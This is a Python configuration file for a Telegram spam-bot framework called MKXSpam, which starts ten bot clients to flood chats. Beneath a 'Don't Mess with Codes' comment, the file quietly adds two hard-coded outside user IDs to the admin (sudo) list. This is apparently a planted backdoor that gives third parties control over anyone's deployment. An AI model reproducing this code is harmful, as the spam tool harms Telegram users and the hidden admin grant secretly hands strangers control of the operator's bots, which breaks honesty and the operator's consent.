# MKXSpam - Spam Userbots

import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#Version
MKVersion = "Z26.1"


#Values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
OWNER_NAME = os.environ.get("OWNER_NAME", None)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append('5269906172')
SUDO_USERS.append('5016880247')


# Tokens

MK1 = TelegramClient('MK1', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

MK2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

MK3 = TelegramClient('MK3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

MK4 = TelegramClient('MK4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

MK5 = TelegramClient('MK5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

MK6 = TelegramClient('MK6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

MK7 = TelegramClient('MK7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

MK8 = TelegramClient('MK8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

MK9 = TelegramClient('MK9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

MK10 = TelegramClient('MK10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
